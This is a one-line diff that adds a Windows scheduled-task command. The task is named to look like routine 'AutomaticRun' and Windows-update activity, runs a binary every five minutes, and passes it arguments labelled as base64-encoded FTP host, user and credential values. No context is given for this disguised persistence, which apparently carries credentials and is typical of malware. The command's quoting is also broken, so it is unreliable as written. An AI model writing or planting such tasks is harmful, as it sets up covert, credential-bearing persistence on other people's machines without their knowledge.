@@ -1,0 +1,1 @@
+schtasks /create /tn "GuardPixelOps\AutomaticRun 1.0" " /sc minute /mo 5 /st 00:01 /tr "C:\Path\To\Your\Compiled\Binary.exe --winupdate "B64E_FTP" --wintoken "B64E_USER" --winversion "B64E_CREDENTIALS" --regger "WindowName""
